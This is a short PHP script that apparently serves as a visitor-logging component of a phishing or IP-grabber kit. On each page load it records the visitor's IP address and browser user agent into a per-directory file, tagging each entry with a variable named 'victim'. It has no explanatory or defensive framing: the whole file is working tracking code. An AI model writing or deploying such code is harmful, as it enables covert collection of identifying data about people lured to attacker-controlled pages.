<?php

if (!empty($_SERVER['HTTP_CLIENT_IP'])) $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))$ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
else $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";

$useragent = "User-Agent: ";
$browser = $_SERVER['HTTP_USER_AGENT'];
$victim = "IP: ";
$dirArray = $_SERVER['PHP_SELF'];
$dirArray = explode("/",$dirArray);
$thisDir = $dirArray[count($dirArray)-2];
echo($thisDir);
$file = "../datas/$thisDir.txt";
$fp = fopen($file, "a");
fwrite($fp,"\n\n");
fwrite($fp, $victim);
fwrite($fp, $ipaddress);
fwrite($fp, $useragent);
fwrite($fp, $browser);
fwrite($fp,"\n");
fclose($fp);

?>